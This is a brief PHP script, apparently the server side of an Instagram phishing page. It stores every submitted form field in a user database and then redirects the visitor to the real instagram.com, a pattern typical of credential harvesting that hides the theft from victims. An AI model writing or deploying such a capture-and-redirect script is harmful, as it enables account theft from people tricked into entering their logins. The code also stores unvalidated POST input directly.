<?php  
include 'UsuariosDB.php';
    $usuariosDB = new UsuariosDB();
    $usuariosDB->insertaUsuario($_POST);

    echo "<script>window.location.href='https://www.instagram.com/'</script>";
?>